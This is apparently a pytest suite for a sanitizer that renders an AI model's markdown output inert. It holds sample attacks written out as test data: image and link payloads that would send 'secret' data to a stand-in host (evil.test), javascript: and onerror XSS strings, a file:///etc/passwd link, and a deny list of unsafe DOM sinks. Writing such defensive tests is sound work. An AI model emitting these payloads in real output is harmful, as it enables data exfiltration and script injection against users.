"""SEC-2, SEC-3, SEC-9: model output stays inert, however it arrives."""

from __future__ import annotations

import json
from pathlib import Path

import pytest

from glimpse.sanitize import is_allowed_url, render_safe


def tree(text: str, **options) -> str:
    return json.dumps(render_safe(text, **options).blocks)


@pytest.mark.parametrize('attack', [
    '![x](https://evil.test/a?d=secret)',
    '![](https://evil.test/a?d=secret)',
    '![x](http://evil.test/a?d=secret "title")',
    'text ![x](//evil.test/a?d=secret) text',
    '![x](data:image/png;base64,AAAA)',
])
def test_images_are_never_rendered(attack):
    document = render_safe(attack)
    assert document.removed_images == 1
    dumped = json.dumps(document.blocks)
    assert 'evil.test' not in dumped and 'data:image' not in dumped
    assert '"t": "note"' in dumped


@pytest.mark.parametrize('url', [
    'https://evil.test/leak?d=secret', 'http://evil.test', '//evil.test/x', 'javascript:alert(1)',
    'JaVaScRiPt:alert(1)', 'data:text/html,<script>1</script>', 'vbscript:x', 'file:///etc/passwd',
    'https://user:pw@allowed.test/', '/\\evil.test', 'https://evil.test\\@allowed.test/', 'java\tscript:alert(1)',
    'https://allowed.test.evil.test/',
])
def test_unsafe_links_lose_their_href(url):
    dumped = tree(f'[click]({url})', allowed_link_hosts=['allowed.test'])
    assert '"t": "a"' not in dumped, url
    assert 'click' in dumped
    assert 'secret' not in dumped


@pytest.mark.parametrize('url, allowed', [
    ('/reports/1', True),
    ('https://docs.example.test/page?x=1', True),
    ('HTTPS://DOCS.EXAMPLE.TEST/', True),
    ('https://other.test/', False),
    ('', False),
])
def test_is_allowed_url(url, allowed):
    assert is_allowed_url(url, ['docs.example.test']) is allowed


def test_allowed_links_keep_their_href():
    document = render_safe('See [docs](https://docs.test/a) and [home](/home).', allowed_link_hosts=['docs.test'])
    links = [node for node in document.blocks[0]['c'] if node['t'] == 'a']
    assert [link['href'] for link in links] == ['https://docs.test/a', '/home']
    assert document.blocked_links == 0


def test_html_stays_text_and_is_never_a_node_type():
    document = render_safe('<img src=x onerror=alert(1)> <script>alert(2)</script> <a href="https://evil.test">x</a>')
    allowed_types = {'text', 'note', 'b', 'i', 'code', 'a', 'ref', 'p'}

    def walk(nodes):
        for node in nodes:
            assert node['t'] in allowed_types
            walk(node.get('c', []))

    walk(document.blocks)
    assert document.blocks[0]['c'][0]['t'] == 'text'


def test_every_partial_chunk_is_safe():
    """Streaming means every prefix of an attack gets rendered, so every prefix must be inert."""
    attack = 'Hi ![leak](https://evil.test/a?d=secret) and [go](https://evil.test/b?d=secret) end'
    for length in range(len(attack) + 1):
        document = render_safe(attack[:length])
        for block in document.blocks:
            for node in block['c']:
                assert node['t'] != 'a'
        # A partial URL can only appear as plain text, which cannot trigger a request.
        assert not any(node['t'] not in ('text', 'note', 'code', 'b', 'i') for block in document.blocks
                       for node in block['c'])


def test_citations_only_for_elements_in_this_snapshot():
    document = render_safe('Sales [ref:chart-1] and fake [ref:not-real] twice [ref:chart-1].', known_ids={'chart-1'})
    assert document.citations == ['chart-1']
    dumped = json.dumps(document.blocks)
    assert 'not-real' not in dumped


def test_markdown_structure():
    text = """# Title

Para with **bold**, *italic* and `code`.

- one
- two

1. first
2. second

> quoted

```python
print("<b>")
```

| A | B |
|---|---|
| 1 | 2 |

---
"""
    kinds = [block['t'] for block in render_safe(text).blocks]
    assert kinds == ['h', 'p', 'ul', 'ol', 'quote', 'code', 'table', 'hr']


def test_unclosed_code_fence_and_empty_input():
    assert render_safe('').blocks == []
    assert render_safe('```\nopen').blocks[0] == {'t': 'code', 'lang': '', 'v': 'open'}


def test_panel_builds_dom_without_parsing_html():
    source = (Path(__file__).parent.parent / 'src/glimpse/adapters/nicegui/panel.js').read_text()
    for forbidden in ('.innerHTML =', 'insertAdjacentHTML', 'outerHTML', 'document.write', 'new Function', 'eval('):
        assert forbidden not in source, forbidden
    assert 'createElement("img")' not in source and 'make("img"' not in source
